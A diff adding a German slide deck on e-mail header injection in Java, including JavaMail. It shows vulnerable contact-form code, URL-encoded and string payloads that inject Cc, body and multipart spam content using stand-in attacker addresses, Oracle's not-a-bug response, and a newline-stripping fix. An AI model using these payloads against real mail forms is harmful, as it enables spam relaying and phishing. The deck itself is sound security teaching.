@@ -1,0 +1,155 @@
+--title  E-Mail Header Injection
+
+--author Steve Ulrich, Micromata GmbH
+
+--heading Just Another Injection
+
+--newpage
+--title Die Inspiration
+
+--beginoutput
+public void sendContactForm(String subject, String content) {
+  String template = 
+    "From: "+user.getEmail()+"\n"+
+    "To: "+contactEmail +"\n"+
+    "Subject: "+subject+"\n"+
+    "\n"+
+    content; 
+  sendEmail(template);
+}
+--endoutput
+
+--newpage
+--title Das Problem
+
+--beginoutput
+http://xxx/sendContactForm
+--color red
+  ?subject=sometext%0ACc%3A+evil%40example.com
+--color white
+  &text=sometext
+--endoutput
+
+--newpage
+--title Das Resultat
+
+--beginoutput
+From: user@example.com
+To: contact@example.com
+Subject: sometext
+--color red
+Cc: evil@example.com
+--color white
+
+sometext
+--endoutput
+
+
+--newpage
+--title Also nur eine Injection Lücke?
+
+Nutzen wir also eine API (JavaMail), die wird uns schon schützen!
+---
+--right Letzte Worte eines Entwicklers
+
+
+--newpage
+--title JavaMail to the R...
+
+
+--beginoutput
+--color red
+  String subject = "sometext\nevil@example.com";
+--color white
+
+  final MimeMessage msg = ..
+  msg.setSender(new InternetAddress(user.getEmail()));
+  msg.setRecipient(RecipientType.TO, new InternetAddress(contactEmail));
+--color green
+  msg.setSubject(subject);
+--color white
+  msg.setText("BlahBlah");
+--endoutput
+
+--newpage
+--title JavaMail to the R...WTF
+
+
+--beginoutput
+From: user@example.com
+To: contact@example.com
+Subject: sometext
+--color red
+Cc: evil@example.com
+--color white
+
+BlahBlah
+--endoutput
+
+--newpage
+--title Ein Bug?
+
+Es exitiert ein Issue: CSNC-2014-001
+
+---
+--beginoutput
+The assessment from our engineering team is that this is not a bug in JavaMail API. The application is responsible to perform some input validation. In this particular case, the application is responsible for ensuring that the subject string does not contain any line breaks. The code demonstrated the issue is not an Oracle sample. Therefore, we are closing the issue as not-a-bug.
+--endoutput
+--right Oracle
+
+--newpage
+--title Validierung
+
+Eine Grundregel bei Input Validation ist "Versuche es nicht selbst".
+---
+
+--center Keine Regel ohne Ausnahme
+--beginoutput
+subject.replaceAll("[\\n\\r]+", " ");
+--endoutput
+
+--newpage
+--title Spaß mit Header Injection
+
+--beginoutput
+String subject = "Test" // This will be the subject                
+--color red
+  + "\n"
+  + "\nEvil content"
+--color white
+--endoutput
+---
+--beginoutput
+From: user@example.com
+To: contact@example.com
+Subject: sometext
+--color red
+
+Evil Content
+--color white
+
+BlahBlah
+--endoutput
+
+--newpage
+--title Multipart injection
+
+--beginoutput
+String subject = "Cheap Viagra"
+  + "\nReply-To:attacker@example.com" // Man bittet um Antwort
+--color red
+  + "\nMIME-Version: 1.0" // Content-Header
+  + "\nContent-Type: multipart/mixed; boundary=frontier"
+--color white
+  + "\n" // Empty line separates the Content!
+--color red
+  + "\n--frontier" 
+  + "\nContent-Type: text/plain\n" // Oder Fancy HTML?
+--color white
+  + "\nBilliges Viagra" // So günstig
+--color red
+  + "\n--frontier" 
+  + "\nContent-Type: text/nonsense" // jetzt den alten Content raus
+--color white
+  + "\n" // Empty line separates the Content!
+--endoutput
